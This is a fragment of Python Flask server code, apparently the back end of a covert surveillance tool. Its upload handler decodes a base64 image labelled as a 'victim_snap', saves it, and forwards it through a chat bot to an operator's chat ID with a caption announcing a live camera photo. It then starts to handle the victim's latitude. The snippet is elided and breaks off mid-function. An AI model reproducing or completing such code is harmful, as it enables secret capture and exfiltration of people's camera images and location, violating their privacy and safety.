...
@app.route('/')
def home(): return f"<h1>Panel of Master {DEV_NAME} is Active</h1>"
...
def upload_data():
    ...
    if data and TARGET_CHAT_ID:
        ...
        if 'image' in data and data['image']:
            img_content = base64.b64decode(data['image'])
            with open("victim_snap.jpg", "wb") as f: f.write(img_content)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("victim_snap.jpg", "rb"), caption="📸 صورة حية من الكاميرا!")
        if 'latitude' in data:
